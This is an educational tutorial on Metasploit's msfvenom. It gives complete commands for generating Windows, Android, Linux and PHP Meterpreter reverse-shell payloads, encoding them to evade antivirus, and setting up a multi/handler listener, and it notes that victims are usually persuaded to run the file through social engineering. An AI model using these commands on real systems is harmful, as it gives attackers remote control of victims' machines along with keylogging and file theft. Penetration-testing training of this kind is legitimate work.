# O.R. 5.2 - MSFVenom

## Overview

- **msfvenom** – a Metasploit tool that combines the functionality of `msfpayload` and `msfencode` into one utility.
- Used to **generate custom payloads** for various platforms and encode them to evade detection.
- Part of the Metasploit Framework – pre-installed in Kali Linux.

> **Disclaimer:** For research and educational purposes only. Never hack a device without explicit permission.

---

## What is msfvenom?

- Previously, `msfpayload` generated payloads and `msfencode` encoded them.
- **msfvenom** combines both into a single tool with standardized command-line options.
- Makes payload generation and encoding much easier.

### Basic Syntax

```bash
msfvenom -p <payload> <options> -f <format> -e <encoder> -o <output_file>
```

| Option | Purpose |
|--------|---------|
| `-p` | Payload to generate |
| `-f` | Output format (exe, raw, elf, apk, etc.) |
| `-e` | Encoder to use (optional) |
| `-o` | Output file path |
| `-l` | List available payloads, encoders, etc. |

---

## Listing Available Payloads and Encoders

### List All Payloads

```bash
msfvenom -l payloads
```

### List All Encoders

```bash
msfvenom -l encoders
```

### List Specific Format

```bash
msfvenom -l payloads | grep windows
msfvenom -l encoders | grep x86
```

---

## Generating a Payload

### Example: Windows Reverse TCP Meterpreter

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.254.192 LPORT=8080 -f exe -e cmd/powershell_base64 -o ~/payload.exe
```

**Breakdown:**

| Component | Value |
|-----------|-------|
| `-p` | `windows/meterpreter/reverse_tcp` |
| `LHOST` | Attacker's IP (listening address) |
| `LPORT` | Attacker's listening port |
| `-f exe` | Windows executable format |
| `-e cmd/powershell_base64` | Encoder for evasion |
| `-o ~/payload.exe` | Output file path |

---

## Setting Up the Handler

After generating the payload, you need a listener to catch the incoming connection.

### Start Metasploit

```bash
msfconsole
```

### Configure the Handler

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.254.192
set LPORT 8080
exploit
```

### How It Works

1. The **handler** listens on the specified IP and port.
2. The victim executes the malicious `.exe`.
3. A reverse TCP connection is established.
4. A **Meterpreter session** opens on the attacker's machine.

---

## Common Payloads

| Payload | Description |
|---------|-------------|
| `windows/meterpreter/reverse_tcp` | Windows Meterpreter, reverse TCP |
| `windows/meterpreter/reverse_https` | Windows Meterpreter, reverse HTTPS (more stealthy) |
| `linux/x86/meterpreter/reverse_tcp` | Linux Meterpreter, reverse TCP |
| `android/meterpreter/reverse_tcp` | Android Meterpreter, reverse TCP |
| `php/meterpreter_reverse_tcp` | PHP Meterpreter, reverse TCP |
| `python/meterpreter_reverse_tcp` | Python Meterpreter, reverse TCP |
| `cmd/windows/reverse_powershell` | Windows PowerShell reverse shell |

---

## Common Output Formats

| Format (`-f`) | Platform |
|---------------|----------|
| `exe` | Windows executable |
| `elf` | Linux executable |
| `apk` | Android package |
| `raw` | Raw shellcode |
| `ps1` | PowerShell script |
| `python` | Python script |
| `c` | C source code |
| `hex` | Hexadecimal representation |

---

## Common Encoders

| Encoder | Description |
|---------|-------------|
| `cmd/powershell_base64` | Base64 encode for PowerShell (Windows) |
| `x86/shikata_ga_nai` | Most popular x86 encoder; polymorphic |
| `x86/alpha_mixed` | Alphanumeric shellcode |
| `x86/avoid_utf8_tolower` | Avoid UTF-8 tolower |
| `x64/xor` | Simple XOR encoder |
| `generic/none` | No encoding |

---

## Quick Reference

### Basic Commands

```bash
# List payloads
msfvenom -l payloads

# List encoders
msfvenom -l encoders

# Show payload options
msfvenom -p windows/meterpreter/reverse_tcp --list-options

# Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe

# Generate encoded payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o payload_encoded.exe

# Generate Android payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o payload.apk

# Generate Linux payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o payload.elf

# Generate PHP payload
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o payload.php
```

### Handler Setup (Listener)

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD <payload>          # Must match the generated payload
set LHOST <attacker_ip>
set LPORT <attacker_port>
exploit
```

---

## Key Takeaways

- **msfvenom** is the tool for creating custom payloads – combines `msfpayload` and `msfencode`.
- **Payloads** are specific to platforms: Windows, Linux, Android, PHP, Python, etc.
- **Encoders** help evade detection but are not a guarantee – use multiple iterations (`-i 5`).
- Always set up a **handler** (`exploit/multi/handler`) before executing the payload.
- **LHOST** must match the attacker's IP address – use `ifconfig` or `ip a` to verify.
- **Meterpreter** is the most powerful payload – offers file transfer, keylogging, screen capture, etc.
- **Social engineering** is often required to get the victim to execute the payload.
- **Defender mindset:** Monitor for unusual executables, PowerShell activity, and outbound connections on suspicious ports.